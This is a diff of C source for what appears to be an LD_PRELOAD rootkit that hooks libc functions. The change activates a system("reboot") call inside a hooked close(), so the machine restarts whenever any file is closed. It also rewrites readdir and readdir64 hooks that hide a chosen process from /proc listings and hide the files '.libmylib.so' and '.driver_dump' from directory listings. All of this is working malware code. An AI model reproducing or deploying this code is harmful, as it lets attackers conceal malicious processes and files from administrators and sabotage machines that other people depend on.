@@ -98,6 +98,10 @@ int fputs(const char *str, FILE *stream)
 
 
 
+
+
+
+
 void* malloc(size_t size)
 {
     void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
@@ -227,9 +231,23 @@ typedef int (*close_func_t)(int); //redenumire basic type
 int close(int fd) {
     close_func_t original_close = (close_func_t)dlsym(RTLD_NEXT, "close");
     int ret = original_close(fd);
-    //system("reboot"); //cand se inchide un fisier se executa aceasta
+    system("reboot"); //cand se inchide un fisier se executa aceasta
     return ret;
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -281,43 +299,70 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-                strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;						\
-                						\
-                                                                        \
-            }   							\
-             if(strstr(dir->d_name, ".libmylib.so") != NULL) {           \
-                continue;                                               \
-            }                  						\
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
+struct dirent* readdir(DIR *dirp)
+{
+    static struct dirent* (*original_readdir)(DIR*) = NULL;
+
+    if(original_readdir == NULL) {
+        original_readdir = dlsym(RTLD_NEXT, "readdir");
+        if(original_readdir == NULL) {
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
+        }
+    }
+
+    struct dirent* dir;
+
+    while(1) {
+        dir = original_readdir(dirp);
+        if(dir) {
+            char dir_name[256];
+            char process_name[256];
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
+               strcmp(dir_name, "/proc") == 0 &&
+               get_process_name(dir->d_name, process_name) &&
+               strcmp(process_name, process_to_filter) == 0) {
+                continue;
+            }
+            if(strstr(dir->d_name, ".libmylib.so") != NULL ||
+               strstr(dir->d_name, ".driver_dump") != NULL) {
+                continue;
+            }
+        }
+        break;
+    }
+    return dir;
 }
 
-DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(dirent, readdir);
+struct dirent64* readdir64(DIR *dirp)
+{
+    static struct dirent64* (*original_readdir64)(DIR*) = NULL;
+
+    if(original_readdir64 == NULL) {
+        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+        if(original_readdir64 == NULL) {
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
+        }
+    }
+
+    struct dirent64* dir;
+
+    while(1) {
+        dir = original_readdir64(dirp);
+        if(dir) {
+            char dir_name[256];
+            char process_name[256];
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
+               strcmp(dir_name, "/proc") == 0 &&
+               get_process_name(dir->d_name, process_name) &&
+               strcmp(process_name, process_to_filter) == 0) {
+                continue;
+            }
+            if(strstr(dir->d_name, ".libmylib.so") != NULL ||
+               strstr(dir->d_name, ".driver_dump") != NULL) {
+                continue;
+            }
+        }
+        break;
+    }
+    return dir;
+}
